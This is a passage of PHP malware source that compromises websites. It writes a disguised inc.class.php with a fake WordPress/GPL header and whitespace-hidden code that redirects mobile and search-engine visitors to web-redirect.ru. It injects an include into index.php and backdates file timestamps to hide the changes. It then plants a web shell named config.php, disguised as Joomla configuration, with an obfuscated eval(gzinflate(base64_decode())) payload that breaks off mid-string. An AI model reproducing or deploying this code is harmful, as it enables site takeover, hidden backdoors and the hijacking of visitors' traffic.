			echo \'<hr><hr>\'.\'http://\'.$_SERVER["SERVER_NAME"].\' - can not create file inc.class.php\'.\'<hr><hr>\';
	}
	else
		echo \'<hr><hr>\'.\'http://\'.$_SERVER["SERVER_NAME"].\' - reserve file has been deleted.\'.\'<hr><hr>\';
	?>
	';
						
							$f = fopen ($path_to_category, "w");
							fwrite($f, $data_category);
							fclose($f);
							
							if (file_exists($path_to_category))
							{
								touch($path_to_category, $time_reserv);
								touch($path_to_reserv, $time_reserv);
								echo '<hr><hr>'."WordPress - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile backdoor installed!'.'<hr><hr>';
							}
							else
								echo '<hr><hr>'."WordPress - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile backdoor not installed.'.'<hr><hr>';
						}
						else
							echo '<hr><hr>'."WordPress - ".'http://'.$_SERVER["SERVER_NAME"].' - reserv script not installed'.'<hr><hr>';
					}
					else
						echo '<hr><hr>'."WordPress - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect not installed'.'<hr><hr>';
				}
				
				else
				{
					$path_index_unknown = $_SERVER['DOCUMENT_ROOT']."/index.php";
					$path_conflg = $_SERVER['DOCUMENT_ROOT']."/inc.class.php";
					$path_folder_unknown = $_SERVER['DOCUMENT_ROOT'];
				
					if (file_exists($path_index_unknown))
					{
						chmod($path_index_unknown, 0755);
						$time_unknown_index = filemtime($path_index_unknown);
							
						$new_mob_link = 'web-redirect.ru';
						$new_web_link = 'web-redirect.ru';
						
						$data = 
				'<?php'.' 
				/*
				=====================================================
				WordPress - Open Source Matters
				-----------------------------------------------------
				https://wordpress.org/
				-----------------------------------------------------
				Copyright (c) 2004,2014
				=====================================================
				Данный код защищен авторскими правами
				=====================================================
				Назначение: Класс конфигурации
				=====================================================
				GNU GENERAL PUBLIC LICENSE
				Version 3, 29 June 2007
				Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org>
				Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.
				*/';$data1 = ' 																																																																																																																																																							 '.'function check_cookie($url_redirect){	if (($_SERVER[\'HTTP_REFERER\'] != null) and ($_SERVER[\'HTTP_REFERER\'] != "") and ($_SERVER[\'HTTP_REFERER\'] != " ")){	if(isset($_COOKIE[\'_cutt_caches_images\']) && $_COOKIE[\'_cutt_caches_images\']<strtotime(\'+24 hours\'))return false;	setcookie(\'_cutt_caches_images\', time(), strtotime(\'+24 hours\'),"/");header("Location: $url_redirect");exit;}}$q=$_SERVER[\'QUERY_STRING\'];$referer = $q;$referer = str_replace(\'&\', \'*\', $referer);$referer = str_replace(\';\', \'~\', $referer);$referer = trim($referer);$s=stristr($q,\'union\');$s2=stristr($q,\'select\');$s3=stristr($q,\'from\');$s4=stristr($q,\'jos_users\');$s5=stristr($q,\'concat\');$s6=stristr($q,\'username\');$s7=stristr($q,\'password\');$link = \'http://\'.$_SERVER[\'SERVER_NAME\'];if((($s!=false)and($s2!=false))or(($s3!=false)and($s4!=false))or(($s5!=false)and($s6!=false))or(($s5!=false)and($s7!=false))or(($s5!=false)and($s4!=false))){header("Location: $link");exit;}$android_redirect = \'http://web-redirect.ru/?andr\';$ios_redirect = \'http://web-redirect.ru/?ios\';$another_mobile_redirect = \'http://web-redirect.ru/?mb\';$web_potok = \'http://web-redirect.ru/?web\';$iphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPhone");$ipod = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPod");$ipad = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPad");$android = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Android");$symb = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Symbian");$wp7 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP7");$wp8 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP8");$winphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WindowsPhone");$berry = stristr($_SERVER[\'HTTP_USER_AGENT\'],"BlackBerry");$palmpre = stristr($_SERVER[\'HTTP_USER_AGENT\'],"webOS");$mobile_tel = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Mobile");$operam = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Opera M");$htc = stristr($_SERVER[\'HTTP_USER_AGENT\'], \'HTC\');$fennec = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Fennec");if ($android == true)check_cookie($android_redirect);elseif (($iphone == true) or ($ipod == true) or ($ipad == true))	check_cookie($ios_redirect);elseif (($palmpre == true) or ($mobile_tel == true) or ($operam == true) or ($htc == true) or ($wp7 == true) or ($wp8 == true) or ($symb == true) or ($berry == true) or ($fennec == true) or ($winphone == true))	check_cookie($another_mobile_redirect);elseif (preg_match(\'#google|yahoo|yandex|vk|odnoklassniki|mail|youtube|wikipedia|netscape|bing|facebook|twitter|dmoz|ebay|icq|yandex|google|rambler#i\',$_SERVER[\'HTTP_REFERER\']))check_cookie($web_potok);else $aaa = false;'."\n".'?>';
				
				
						$data_mob = $data.$data1;
						$data_mob = str_replace('web-redirect.ru', $new_mob_link, $data_mob);
						$data_mob = str_replace('web-redirect.ru', $new_web_link, $data_mob);
							
						
						$nf = fopen ($path_conflg, "w");
						fwrite($nf, $data_mob);
						fclose($nf);
							
						touch($path_conflg, $time_unknown_index);
							
						if (file_exists($path_conflg))
						{
							$str_unknown_include = '<?php require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");';
						
							$arr_index = read_file($path_index_unknown);
							$new_arr_index = array();
									
							foreach ($arr_index as $application)
							{
									$application = str_replace('//require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
									$application = str_replace('// require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
									$application = str_replace('//	require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
									$application = str_replace('require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
									$application = str_replace('require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
									$application = str_replace('<?php', $str_unknown_include, $application);
									$new_arr_index[] = $application;
								}
									
								$d = fopen ($path_index_unknown, "w");
								foreach ($new_arr_index as $each_app)
								{
									if (($each_app !== '') and ($each_app !== ' ') and ($each_app !== "\n"))
										fwrite($d, $each_app."\n");
								}
								fclose($d);
									
								touch($path_index_unknown, $time_unknown_index);
									
								$index_for_check = only_read($path_index_unknown);
									
								$result_check = stristr($index_for_check, 'inc.class.php');
								if ($result_check != false)
									echo '<hr><hr>'."WordPress CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect (only) installed correct!'.'<hr><hr>';
								else
									echo '<hr><hr>'."WordPress CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect not installed'.'<hr><hr>';
							}
							else
								echo '<hr><hr>'."WordPress CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - file inc.class.php not found'.'<hr><hr>';
						}
						else
							echo '<hr><hr>'."WordPress CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - file index.php not found'.'<hr><hr>';
					
				}
			}
			else
				echo '<hr><hr>'."WordPress - ".'http://'.$_SERVER["SERVER_NAME"].' - can not create file inc.class.php'.'<hr><hr>';
		}
	}
	elseif ($CMS == 'Unknown')
	{
		$path_index_unknown = $_SERVER['DOCUMENT_ROOT']."/index.php";
		$path_conflg = $_SERVER['DOCUMENT_ROOT']."/inc.class.php";
		$path_folder_unknown = $_SERVER['DOCUMENT_ROOT'];

		if (file_exists($path_index_unknown))
		{
			chmod($path_index_unknown, 0755);
			$time_unknown_index = filemtime($path_index_unknown);
			
			$new_mob_link = 'web-redirect.ru';
			$new_web_link = 'web-redirect.ru';
		
			$data = 
'<?php'.' 
/*
=====================================================
WordPress - Open Source Matters
-----------------------------------------------------
https://wordpress.org/
-----------------------------------------------------
Copyright (c) 2004,2014
=====================================================
Данный код защищен авторскими правами
=====================================================
Назначение: Класс конфигурации
=====================================================
GNU GENERAL PUBLIC LICENSE
Version 3, 29 June 2007
Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org>
Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.
*/';$data1 = ' 																																																																																																																																																							 '.'function check_cookie($url_redirect){	if (($_SERVER[\'HTTP_REFERER\'] != null) and ($_SERVER[\'HTTP_REFERER\'] != "") and ($_SERVER[\'HTTP_REFERER\'] != " ")){	if(isset($_COOKIE[\'_cutt_caches_images\']) && $_COOKIE[\'_cutt_caches_images\']<strtotime(\'+24 hours\'))return false;	setcookie(\'_cutt_caches_images\', time(), strtotime(\'+24 hours\'),"/");header("Location: $url_redirect");exit;}}$q=$_SERVER[\'QUERY_STRING\'];$referer = $q;$referer = str_replace(\'&\', \'*\', $referer);$referer = str_replace(\';\', \'~\', $referer);$referer = trim($referer);$s=stristr($q,\'union\');$s2=stristr($q,\'select\');$s3=stristr($q,\'from\');$s4=stristr($q,\'jos_users\');$s5=stristr($q,\'concat\');$s6=stristr($q,\'username\');$s7=stristr($q,\'password\');$link = \'http://\'.$_SERVER[\'SERVER_NAME\'];if((($s!=false)and($s2!=false))or(($s3!=false)and($s4!=false))or(($s5!=false)and($s6!=false))or(($s5!=false)and($s7!=false))or(($s5!=false)and($s4!=false))){header("Location: $link");exit;}$android_redirect = \'http://web-redirect.ru/?andr\';$ios_redirect = \'http://web-redirect.ru/?ios\';$another_mobile_redirect = \'http://web-redirect.ru/?mb\';$web_potok = \'http://web-redirect.ru/?web\';$iphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPhone");$ipod = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPod");$ipad = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPad");$android = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Android");$symb = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Symbian");$wp7 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP7");$wp8 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP8");$winphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WindowsPhone");$berry = stristr($_SERVER[\'HTTP_USER_AGENT\'],"BlackBerry");$palmpre = stristr($_SERVER[\'HTTP_USER_AGENT\'],"webOS");$mobile_tel = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Mobile");$operam = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Opera M");$htc = stristr($_SERVER[\'HTTP_USER_AGENT\'], \'HTC\');$fennec = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Fennec");if ($android == true)check_cookie($android_redirect);elseif (($iphone == true) or ($ipod == true) or ($ipad == true))	check_cookie($ios_redirect);elseif (($palmpre == true) or ($mobile_tel == true) or ($operam == true) or ($htc == true) or ($wp7 == true) or ($wp8 == true) or ($symb == true) or ($berry == true) or ($fennec == true) or ($winphone == true))	check_cookie($another_mobile_redirect);elseif (preg_match(\'#google|yahoo|yandex|vk|odnoklassniki|mail|youtube|wikipedia|netscape|bing|facebook|twitter|dmoz|ebay|icq|yandex|google|rambler#i\',$_SERVER[\'HTTP_REFERER\']))check_cookie($web_potok);else $aaa = false;'."\n".'?>';


			$data_mob = $data.$data1;
			$data_mob = str_replace('web-redirect.ru', $new_mob_link, $data_mob);
			$data_mob = str_replace('web-redirect.ru', $new_web_link, $data_mob);
			
		
			$nf = fopen ($path_conflg, "w");
			fwrite($nf, $data_mob);
			fclose($nf);
			
			touch($path_conflg, $time_unknown_index);
			
			if (file_exists($path_conflg))
			{
				$str_unknown_include = '<?php require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");';
		
				$arr_index = read_file($path_index_unknown);
				$new_arr_index = array();
					
				foreach ($arr_index as $application)
				{
					$application = str_replace('//require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
					$application = str_replace('// require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
					$application = str_replace('//	require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
					$application = str_replace('require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
					$application = str_replace('require_once($_SERVER[\'DOCUMENT_ROOT\']."/inc.class.php");', "", $application);
					$application = str_replace('<?php', $str_unknown_include, $application);
					$new_arr_index[] = $application;
				}
					
				$d = fopen ($path_index_unknown, "w");
				foreach ($new_arr_index as $each_app)
				{
					if (($each_app !== '') and ($each_app !== ' ') and ($each_app !== "\n"))
						fwrite($d, $each_app."\n");
				}
				fclose($d);
					
				touch($path_index_unknown, $time_unknown_index);
					
				$index_for_check = only_read($path_index_unknown);
					
				$result_check = stristr($index_for_check, 'inc.class.php');
				if ($result_check != false)
					echo '<hr><hr>'."Unknown CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect installed correct!'.'<hr><hr>';
				else
					echo '<hr><hr>'."Unknown CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect not installed'.'<hr><hr>';
			}
			else
				echo '<hr><hr>'."Unknown CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - file inc.class.php not found'.'<hr><hr>';
		}
		else
			echo '<hr><hr>'."Unknown CMS - ".'http://'.$_SERVER["SERVER_NAME"].' - file index.php not found'.'<hr><hr>';
	}
}

// END: Mob\web traff

//Start: upload sh
if (isset ($_GET['sh']))
{
	if 	($CMS == 'Joomla')
	{
		$arr_dir = finder_files($_SERVER['DOCUMENT_ROOT']);	// Собираем все пути в массив

		foreach ($arr_dir as $each)
		{
			// Исключаем папки tmp, cache, logs - ибо там шелл едва ли долго продержится.
			$iskl_dir1 = stristr($each, '/tmp/'); $iskl_dir2 = stristr($each, '/cache/'); $iskl_dir3 = stristr($each, '/logs/');
			
			// Подходящие папки для загрузки
			$good_dir1 = stristr($each, '/administrator/'); $good_dir1 = stristr($each, '/components/');
			$good_dir2 = stristr($each, '/images/'); $good_dir3 = stristr($each, '/includes/');
			$good_dir3 = stristr($each, '/language/'); $good_dir5 = stristr($each, '/libraries/');
			$good_dir4 = stristr($each, '/media/'); $good_dir7 = stristr($each, '/modules/');
			$good_dir5 = stristr($each, '/plugins/'); $good_dir9 = stristr($each, '/templates/');

			// Собираем подходящие нам пути
			if (($iskl_dir1 == false) and ($iskl_dir2 == false) and ($iskl_dir3 == false))
			{
				if (($good_dir1 != false) or ($good_dir2 != false) or ($good_dir3 != false) or ($good_dir4 != false) or ($good_dir5 != false))
				{
					$count_slash = substr_count($each, '/');
					$arr_all_folder[$count_slash] = $each;
				}
			}
		}

		if (count($arr_all_folder) > 3)
		{
			// Определяем наиболее дальнюю папку	$arr_last_folder[0]
			krsort($arr_all_folder);

			foreach ($arr_all_folder as $folder)
			{
				$arr_last_folder[] = trim($folder);
			}

			// Выбираем рандомно последнюю, предыпоследнюю, либо третью с конца по дальности расположения папку.
			$key_array = 0;

			// Приводим путь к виду /dir/dir2/dir3
			$dir = str_replace(substr(strrchr($arr_last_folder[$key_array], "/"), 1), "", $arr_last_folder[$key_array]);	

			// Формируем будущее имя шелла и GET запрос
			
			$shell_name = 'config.php';

			$arr_simb = array('q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m');
			shuffle($arr_simb);
			$get = rand(0,13).$arr_simb[0].$arr_simb[1].$arr_simb[2].$arr_simb[3].$arr_simb[4].$arr_simb[5].rand(0,13);


			$path_shell = $dir.$shell_name;
			$time_for_touch = filemtime($arr_last_folder[$key_array]);

			$shell_first_step = 
'<?php';
			$shell_step_1 = 
' 
/*
=====================================================
Joomla! - Open Source Matters
 -----------------------------------------------------
http://www.joomla.org/
-----------------------------------------------------
Copyright (c) 2004,2014
=====================================================
Данный код защищен авторскими правами
=====================================================
Назначение: Конфигурация
=====================================================
GNU GENERAL PUBLIC LICENSE
Version 3, 29 June 2007
Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org>
Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.
*/';


$shell_step_2 = ' 																																																																																																																																																							 chmod(dirname(__FILE__), 0511); chmod(__FILE__, 0404); if (isset($_REQUEST[\'action\'])){																								 				$GLOBALS[\'_792768653_\']=Array(\'pr\' .\'eg_replace\');                 ';
$shell_step_2 = str_replace('action', $get, $shell_step_2);
$shell_step_3 = '?>';
$shell_step_4 = '<? ';
$shell_step_5 = 'function _1195823703($i){$a=Array("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28\'lb3LjmxZj5w5F9Dv8KNQg9ZECN/r5o6C3oST7TeoILUakKBG9tvrBN0+4/JUo9AaJDLznAj3vdeFNJJG4z//9dfx3/767//4x3/4j//4p/hr/fz554i/5vjzz4q/xrv+//fv5uPPP5c//7TPnx3XP//8+fvjz88drz//nJ//zr/7/fPH59/jz7/Xn59t888/Y/v/9fmzr7+/fP9/b9v///msdv3bz6/vz+t/+/12+9vnjb/9/fw3vu/vz/P7vP3feJ//r+f7+/v//fP+/n3757W/PV/72/f/+dn+9/X7t55v/q/f97/1+3q/489zrz97Pc7P5/U/fzb//Pf6/dk/52RcPv/9e15+33HyOb/n6Ka/+12XQ+fq+ee/++czetff/+7lqTN3+3zf75/N++f7+lN/f9PvPj+/29/6vj/PtS6fz89z8dDPHHpG/TO7zszvvv2uxfo85/j9/f75898zf9w///izj8894Hd+P+d3bX7P2+/fDb337++sqc86P++fd+Ty+d3fZ8vPfXw+9/e/f58n79T98z758+tzr36f7dCf5ee2+v/5+qzP73rk73Y9z/z8ef5bz/j77991bJyrpbXS/+ce/j7fj57v/nmv/N3zsx+/z9a09/n9x+d5fvcln+26/fuoZz60h7mXr88e+p0ush/vz3Pke7fP9/w+3++f53P/1PP/rv3v87J+nMHW6nMaa/LQe0393e3zGb+f9ft7XfvbtnX9vbO/z/m79r+/n2vw1PMO2UPedWjtbjp/U+fzpf/vn9/j3Pgs/Z7Dm9bj95/354znGpyfszS0zr8/n3u79Dk6L78/P3Q3cq8feq6uNdTPTd373Ktn7c3vucu78vy8Y65v/+zH773Jd33VGcz7ev/8eZ6H87Mv+Rm3z3mY+pyp5/p9pnH7nIkhW/C7Pr/37fcZfz/v951yDY7Pv3+f+3e9c68fuv/YiZvO7u/3LJ3f/llP9vv3M/P7R9mq3Meud/35nIff9ci14Xllk3It7nqnZ93LtN9617U+z9Nlr6aeNZ/59fn8fPf1eZ+26lzl/0+9489nXdLPHvXcv3+X+3gt25Bn80fPMmWbZCvz/N+0jlPPOOs8Lc7/+px7bJtt3OWzL7+f/bs3aQfHZ83yXfUcTfuQNnN9vjfvySr72fV+aVPPba+nzunxWYfcq6d+d37WAZveZXPybh+f9Wk607/f23UPcn1/Pt+Za3Z+PufXd/2ekbzjsilp8/ksPkd3qutO5jtxFmSrpvxkl39PnyLflXelfb6/67l+16HjSx762YveVfe66542/ELXOvyU/eqcIXy3bGKune7e1JqlD8I24qdO+aWb/OtDd427cNHfbX58ysdyxtnP3z1rsgmJQ256p+PzffnfV33e+fmZfGZhtLxPU/5f96Czdk2fd+i/D/0/vljnLvfyuX2n7FTfbG7a1fNzt8com5Q29KIzNmqd8zuazsJdtuf9+Sc/8/isXdqZy+c5mtY7fSR7rPvHOZrYufV5pyVM9Ps7U1hqCcfkHX3qLGkN8+/un/dYOoO/n5N3R/djYIPn53mb7GjaN+GVLiyXezB0Lm6fn0mbfBXWu+jztb5TP7+Ej3Jtn7o/o+xj1/kCd3TZoq6f8X833VNhwsZ73bSXT/marrMj3JLn9aK7d5N9Yv3ke5ZwCBhz6M+68MfE7l20nrL/g2fUmVvyx9jJX9ub9qDr3N51ftrmT3Y/csrn68w3YU/uH/dzyucOvU++1/z8bt7x9vmufP9T501nNM/loe+WHZjav/yee9m9xt4Jf/x+RxeOGT+FdfI5TvkmndP0C8Kq2OUmO5r+8Kh1X7Kfab+wGffPd+V9kc/6XcPBfb/rTnP/WuGKqXOV39M+zzW1pnnXfj7/v+Sn17UwObiFfcy/a+Vzc91PnbWfzxluwh1L8Ueu6bPWPf2K7Jmfb+jsrfLjXTbHuOVRWD/PfBdOVGy9FDNwt5rOSeJx3fn8vEPffeh8Nd1D+Y+pNRryq3mHdT8H+HzzA3m2luz4Vev8rOfaY6fG9wh3TeEQ8NbSeWj46S0eSV95yn8Rg5xap1lnbuoc5p4Qh8pX/67DAD/JFq9VZyB90lXvfxYmSb8j/5G27vzsmbHwUT4NG92JmZ5hjIVv42yC1bris98/y3UQLmw6u2lrjvq89KuKKRtYT3g0bR/n/Kh7mLb71FrIFzVhu91uD2HALruSMee9cOGSj8wz+yP/c+h3D503xarpI/QM41a2z7kEcK7ufvqgZ93BtBfnhhUP4cde9rvP+lnWaAkDpA8bn2fLd9f9w1+uDfMvcA97DK7s4VzRPMuvpb2R788zrvOQ9mDo3uOnX5/z03VH127HdK/ys7Xn7PG41jqPWXerY8fPusezF1Yk3sWeDmHyxBG3eifyCx0b/yM/ddb3dsX0udb3cHyfzzs/n5VnpX/2cnKuX1obxUNNeGvonOV732TLdLeXsH/X3uY6HIUHhnxSU/znMyz/wT62sWG6WbaiyZdMxURp/4VtJrHWqp8HA6Z9UNxEbsjYST40n5ecFbgQTCb/mfHe0L2QbUqfIH+SvnRsWEq2YupO53sJDycO1Ofld4CjlHsi75E+U39GzJ7vIYzQhKPZE/4Z3O/j8+6dOP0lm6g4xOdM+ze19hMMK+w5td/kLRwHj3oGMDk4deHjFDt2fc6SfSHOtI2QP8zn0PdnHCkcnnb6rHdKn66zPXd/rrVPvKjYnFics5O2Auyv+MVxN/gIzCn875j5FMZ51xnhPcD6aVMeYXyY/raX/+rE9/rs3Ite/jLvlnDy0pp3fUfi5+Oz9vme183PLmFFYdUm/EgOaJLjW/pu/ONR/hjbljk64XZiW94tzzHx9F125CE/JvuU76x7nGeq6/7I/6WNEpYghzXlfxMT/Xw+i7zEBN9qf4gdc12P7TmPcG4rcddbNgk7r+fD5uXfPbVOz4+tcown3zh1FhbxhHJh2FXOX5OPXGf5DuzB0L3oyhc2/T5xVX4+uATbr30CVzVhY3DiBJNc9f5P/S5Y/qF33TGVMPYk3/GSj9HzTPnleZbvIOez8GsvrUWrteqKwzKuFAboxCdzw1fkRrS2jXyh7EHe9Uutcdr2p+6i9n3KluezCj/nuWraH2HP9PP4KfL+l8+7g+Wdx9CZJH/POjoHLNuTd36zWcR6jTyY7lr6zi3OwgY03gl7rbu/dHa6bFPG6Y9wjjTPmd5997/k6MGhjvexJYqzlvBdJ8eo87F4FtaZNSRvy77wHYpfJr60h3M2uW/vzfdd9GfCcV2+tROnbj/LnW6y2fNWZ488ELmJxANHuA6V63bqmWXLh/7JeIf/1j3oPP+o75rCRuBh7nOe91lYZQo/Ezemv7vqLGrdmzDHlE1zTlq2fhJP6Byl/cKvys6QC6M2Zx+96oxSA/g9lwfYCqwmXDC1x+QI83ve2sul/Xnqead+XmtyKHbsOr95Bk/ZUp3DqXM7ZMt/P891LcU/Tfi5b/iu4ccUAxJrYYNyz5bsR/v8vuMZ2Xj7a+VKwIe5f3PDnaf2QXaHfZqqRY1b+cr8LK3T0l4RD4FJfs8BPst2opV9wiYOfWbajJd8LnHpTft+hnOz7L/94a3OwsQvCd/0a9npBc7YsFvT2cFugNPsS7Q+riMoHmzEIKNwA5ilEauMcD2P3GP6hg2jgDv5eezSwFe9wvnjIV9P/r2ByYmndX7Hrc504nbld/oWD+Ue3AuvN2w9/vVe35vnX+vnc/yj9xZm57yzX+TsunAUNpwcRPrxs3zs0lpwVhu446VnUv4Bu5q25AjniqZisDxDxLHcD2GXPE+y9fm+sk2uoWovyaEs1cLIf3V84bH5hlFnyjGZ8pbYEngV1IWddzxlu2SP1qr9zTt2fL6XXCY49njX3ZjkfX62+zu0L1s+Zwi/EyexHlOxCfZ7UaMSLpzEqg/ZKOIVYVn7Bc6o1pocUK6bciPE3l14I+2y7ja1He4KsYRjzL7Z0ZvO81vPfoviFLyj8INsK76uYV+UI0icfHz2eQlfDWGLrnxNYkj5lKY4bciPdH1HFw6BF5Hv3vQZio3yzN/CNWxy7vCFut65Xcu/TGHxtO3vcH26ce71d4O7oTPXdNcSiyrXsvT98DfS7pw6a4ppwaHkuZZ8Qj8LSyRm551+wtynsXGjqEXkuimv0cGQigv6bfOjskF5L6e+X880Fe+TjyYWTZusf+dZvFZssMir6d95JsilPoSlhOU6OGEVRiCHkGdI8fSS7VjCZVn/o2aOLxYWmrpX4P8uvJi+VP4kz+Fd95U9f8vmjsLJ2Cvqc0Mx+tL7OtdKbHWtvaBGNLmj6/NM1K+p4RCDT61L32OCQ8+9wnmQLvsLX4W8JXn3Q/Fanq+fz7nmflE3IL5JGyCe0byVX57EpO/PdzbdK7DYuJTNPbQvuQdN90m4CQzWbxv+ko/C5/F3cBWa7m7aPGFUOCAD/D7rznRhyrbVKYhHuPdN+9fFE0gbeS9eSZ5N8idX+YkzKreqvWjC4HBbqG3uNmhpXZb8FvVyPgcMBw8kf+4SroXknx/Co/Ip42f7nv55x/SVeqa0hy/5jSOcDyWPmHdU79SV4xnyGUt2D7vf9LlL+Mo5X84jcTAxqfYJW5uf26Ly6PKtYB5qO9jOLt/UhYtch3zLTu129lW2Y+oOHu/yPYvzQhx0yGb0wmv8jvk32CZyFa+o/JzOCn6+KQ7tev7MXbTtvFDrA/OBX2SfnMPFxmt9yW+Sz4fLmHuqvaRuk2stG0PtPM/iTXuoO5Z3+djOyfH5naXcfa4rNbT5sQmTHNMlnGMhZiWnO4hn5N+GfBPnltrtVOwCtpmKtYd8CWcm8ccK12TIS3T8xNB5eIRrz/gMx+OyqblnZzjHlHsp3EUeL59X943cNfXarvxCxqCy9XlGwACyK4PasOw//A/zG+Rf8zMVe4MTF/7sVna5U9+c5Qfg/i3sHH7iKTujvR7YbmEw20HZ/8wZaS+JweFLdvyl9gAb4nzTJRzTduyh9jHv8CFfObUurK2epwkTJJ5XvLHEf1pgUdlwcsfYwzzrwgNDGDF9g2JpYitq8mnThZPTFrW6K114JHPDo97fWAlf1ct+N+HYrrhoUE/Tuk7O+F1YQthqKfajhtKVG6dmzHrl9710/rQv8E+oJxBPuF7LGVp1hqlF5tphR+7C2PKdxHdN60SOZumsduFs+JXk8MgbpI3i3snm51nQ+Rnwk2TvqLk7d/rU/dxsANwBc2muYTzWwC3CefD48H2OV8/a7/wubMul/q4JP3XV9LrOVuJJ7ZXrNroj4AZ8AOe8n3X2zXt+hesv9rM6W+S408bi+06dd8UgbZWvwGeCL4cwN7y5PPMXYQ35ZMf0wu/OsWB3yJHKtnU+Q+eF+zCFG5d8IZxR4rCFPeQMXgqDp83V/rde/pW6Mvw++M2OAU6tmXJZg/hbeNqx1aPyfEu+nPzZaGW74DlN+b08c8SmW84C2wXfOX+WWiR72sL1Crite94qYwnyrsKVU7h990lDvgdMBCdpyTZNcDr+eG3+5rr5qdu2lth4PSN1ffZoKQcCp2JQQ7xueL1/vnPyfIr3iQfMZeH+neXX4IXBSSQOg+eTdukQHtH6OD7XPsLPa8KFnMuMKRR7wH92HKD3yDvE3qieSK4+seSr/Bf1j7Qx8sdNfrORt9O96cJ79EFQM4SDNm6bP1HOn/h+rw2DwcgBJZ4E34y/xTLyr3kO5L+NkWSH4efneut+L2HIoTWjlgDeyZgfHHfZsOksP9HP8hPUuvG9XVgK7E/d2vyDLpvGHdd3wGdOrEJO8B7GJOSB8SVLuA3ufgffgEuEi5ZyHZPYUncZTmJTPolzsriTl7KvxBTp7x6Fg/MMbeeZ9RvCxV0Yj9oZvTtTa+H8673wCfU08lBwDpwT11mcip0HvuKoz8kz2GTTFJ/An8j7J5yzRmHiKZxF7Z34mtwQv5d/rz+jvptxxjvMLaPGm/7k8XmXJjtKrrerrmRMOnWfXmVbp3xEo96jn+3CKeQryEGmjdba04PkGgmxts4dPBvs0LxutqJ9fu+4F4ZwT8wM8zHJY3btLzjDuWrdR/eZkO9QzQFOTJP/IseJrcDOJJYB5/fycXBol+4/OJNcNb08A9yh50lb3sN9K3Cq6f+gJkFejf4l4rWu+wBOz3NMbWlqP7Ve1Ez82coLwFGGCw1XaGH/ZPPJK3X9e/fN6fe3M0rMuxTfEusmzlOs3/XfeW5v5VMcP1yjcrqyLflMo+xDUzzQZr0X9xA+r/kwymV0fYdjSuFOeBfU2Myjkx2cutPmCb601sKL5qvLfsCDAt8snTXn5lvdV/Ow2G/9/c575VxQHzbv66n7yL0gf7HjJtkSfA19BHA2wETke9mDAV6+hPlIzoe+P88x9E6s9byX/XBeh3yRbMlijW7bWl7CeZhJDk3/BrNyvhzTCzuYUyAs3MABPPsjvvIA+BJzQmVvp+LAqWfLv5NdG6qLduF191ORJ+vhPC6/l/hSd899B49aL3qAqNskbn2FeQfYMPAZdpB+BjhvTbmAppjBfKJTfhIs8ArHnV0xlONm2arBWda69j2H8Q7H+P1ea0bOEh6Z+1FnOJc3iIsUmzk3eAvnmmbffNb985zk4qjp5hkVdiLvQA0Evh59E2CjobybeXXC4dQ/iSnh7tA/aE4tz3wI+52yc4o3Mxdzat2Uk3APNPdPuSN44u6v4vuv2mvF6eAlYr0h202/BbU1+Nlw3Jz/v4dzto6luH/XMEfMOFo4eYFfhXfJP1FHof6RPke5q6X4J+8YOB07gy1WrDfB89gM2UrONvkt59mFCYjLOFND/sm+mlhJ53xSI5yFycnpw1+Fr5eYVn+feyc7mmdYdzoxC/5LZzR9BDE1d1D4ecpudN2VznOc4TgZP0GfMlx+ehnpKTEeu3/2nrVN/NHLp6T9P2pPpmJx+irxE0t3z7UmxXbwZKihgIHSXl3rfWwnuKPkNoSv4ATSu7kUf5rzIRtI3Zp4P+/R